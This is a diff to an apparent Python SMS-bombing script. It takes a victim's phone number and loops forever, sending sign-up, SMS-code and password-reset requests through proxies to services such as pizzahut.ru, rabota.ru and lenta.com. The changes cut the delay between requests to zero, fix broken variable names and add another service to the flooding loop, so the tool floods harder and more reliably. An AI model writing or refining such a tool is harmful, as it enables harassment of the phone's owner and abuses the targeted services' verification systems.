@@ -25,7 +25,7 @@ print('''
 
 
 a = input('phone number')
-b = 10
+b = 0
 class services():
 	# service number 1
 	def service1(self, a, proxies):
@@ -181,35 +181,35 @@ class services():
 	# service number 25
 	def service25(self, a, proxies):
 		r= requests.post('https://service.uramobil.ru/profile/smstoken',
-			json={{'PhoneNumber': a, 'Captcha': 'rasd'}}, headers={},
+			json={{'PhoneNumber': a, 'Captcha': 'rasd'}},
 			proxies=proxies)
 		print('service,uramobil.ru ' + str(r.status_code))
 
 	# service number 26
 	def service26(self, a, proxies):
 		r = requests.post('http://taxiseven.ru/auth/register',
-			data={'phone': a}, headers={},
+			data={'phone': a},
 			proxies=proxies)
 		print('taxiseven.ru ' + str(r.status_code))
 
 	# service number 27
 	def service27(self, a, proxies):
 		r = requests.post('https://pizzahut.ru/account/password-reset',
-			data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': phonePizzahut, '_token':'*'},
+			data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': a, '_token':'*'},
 			proxies=proxies)
 		print('pizzahut.ru ' + str(r.status_code))
 
 	# service number 28
 	def service28(self, a, proxies):
 		r = requests.post('https://www.rabota.ru/remind',
-			data={'credential': phone},
+			data={'credential': a},
 			proxies=proxies)
 		print('rabota.ru ' + str(r.status_code))
 
 	# service number 29
 	def service29(self, a, proxies):
 		r = requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',
-			json={'phone':phone},
+			json={'phone':a},
 			proxies=proxies)
 		print('lenta.com ' + str(r.status_code))
 
@@ -280,6 +280,8 @@ while 1:
 	services().service23(a,proxies)
 	sleep(b)
 	services().service24(a,proxies)
+	sleep(b)
+	services().service25(a,proxies)
 	sleep(b)
 	services().service26(a,proxies)
 	sleep(b)
